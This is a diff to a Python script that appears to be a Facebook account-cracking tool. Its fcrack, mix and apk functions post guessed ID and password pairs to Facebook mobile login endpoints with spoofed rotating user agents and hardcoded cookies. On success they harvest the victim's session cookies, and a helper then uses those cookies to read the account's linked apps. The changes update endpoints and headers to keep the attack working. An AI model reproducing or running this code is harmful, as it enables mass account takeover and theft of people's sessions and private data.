@@ -130,14 +130,14 @@ oks = []
 cps = []
 loop = 0
 url_lookup = "https://lookup-id.com/"
-url_mb = "https://mbasic.facebook.com"
+url_mb = "https://free.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ugen=[]
 uas=[]
-usa = ["Mozilla/5.0 Windows NT 11.0; Win64) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
 rr = random.randint
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
@@ -282,7 +282,7 @@ def cek_apk(session,coki):
             print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -650,7 +650,7 @@ def apk(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -661,12 +661,12 @@ def apk(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_mbasicfb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWWRHTc1kuItaqX1a-7v-IrvCjk.BkUdZS.xN.AAA.0.0.BkV_Bp.AWXIxM3fZkI',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Microsoft Edge";v="112"',
+    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUivHAfXKcq__NnXcMrQEhRxpc.BkUdZS.xN.AAA.0.0.BkWG_3.AWWtul_PU_I',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
@@ -674,7 +674,8 @@ def apk(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.225 Safari/537.36',
+}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -708,7 +709,7 @@ def mix(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://free.facebook.com').text 
+            free_fb = session.get('https://x.facebook.com').text 
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -719,12 +720,12 @@ def mix(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_mbasicfb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWWRHTc1kuItaqX1a-7v-IrvCjk.BkUdZS.xN.AAA.0.0.BkV_Bp.AWXIxM3fZkI',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Microsoft Edge";v="112"',
+    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUivHAfXKcq__NnXcMrQEhRxpc.BkUdZS.xN.AAA.0.0.BkWG_3.AWWtul_PU_I',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
@@ -732,7 +733,8 @@ def mix(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.225 Safari/537.36',
+}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -765,7 +767,7 @@ def fcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://free.facebook.com').text 
+            free_fb = session.get('https://free.facebook.com').text 
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -776,12 +778,12 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_mbasicfb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWWRHTc1kuItaqX1a-7v-IrvCjk.BkUdZS.xN.AAA.0.0.BkV_Bp.AWXIxM3fZkI',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Microsoft Edge";v="112"',
+    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUivHAfXKcq__NnXcMrQEhRxpc.BkUdZS.xN.AAA.0.0.BkWG_3.AWWtul_PU_I',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
@@ -789,8 +791,9 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.225 Safari/537.36',
+}
+            lo = session.post('https://mabasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -822,7 +825,7 @@ def fcrack1(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -833,12 +836,12 @@ def fcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_mbasicfb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWWRHTc1kuItaqX1a-7v-IrvCjk.BkUdZS.xN.AAA.0.0.BkV_Bp.AWXIxM3fZkI',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Microsoft Edge";v="112"',
+    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUivHAfXKcq__NnXcMrQEhRxpc.BkUdZS.xN.AAA.0.0.BkWG_3.AWWtul_PU_I',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
@@ -846,7 +849,8 @@ def fcrack1(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.225 Safari/537.36',
+}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -881,7 +885,7 @@ def fcrack2(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            mbasic_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -892,12 +896,12 @@ def fcrack2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_mbasicfb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWWRHTc1kuItaqX1a-7v-IrvCjk.BkUdZS.xN.AAA.0.0.BkV_Bp.AWXIxM3fZkI',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Microsoft Edge";v="112"',
+    'cookie': 'dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUivHAfXKcq__NnXcMrQEhRxpc.BkUdZS.xN.AAA.0.0.BkWG_3.AWWtul_PU_I',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
@@ -905,7 +909,8 @@ def fcrack2(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.216 Safari/537.36 Edg/112.0.1669.36',}
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.225 Safari/537.36',
+}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
